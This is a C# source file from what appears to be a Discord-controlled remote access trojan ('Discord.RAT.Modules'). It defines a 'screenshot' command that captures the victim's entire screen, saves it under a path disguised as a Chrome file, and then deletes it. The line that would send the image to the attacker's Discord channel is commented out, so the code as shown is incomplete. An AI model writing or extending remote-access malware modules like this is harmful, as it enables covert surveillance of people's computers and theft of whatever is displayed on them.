using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Discord.RAT.Modules
{
    public class Screenshot : ModuleBase
    {
        [Command("screenshot", RunMode = RunMode.Async)]

        public async Task GetScreenshot()
        {
            try
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }

                    bitmap.Save(@"C:\Program Files\Google\Chrome.jpeg", System.Drawing.Imaging.ImageFormat.Jpeg);
                }
            }
            catch (Exception ex)
            {
                await ReplyAsync("Couldnt take screenshot, reason: " + ex.Message);
            }


            var dir = @"C:\Program Files\Google\Chrome.jpeg";

            var embed2 = new EmbedBuilder
            {
                Title = "New screenshot!",
                Description = "Saved in " + dir,
            };

            // await Context.Message.Channel.SendFileAsync(dir, "Screenshotted.", false, embed.Build());

            await Task.Delay(500);

            File.Delete(dir);
        }
    }
}
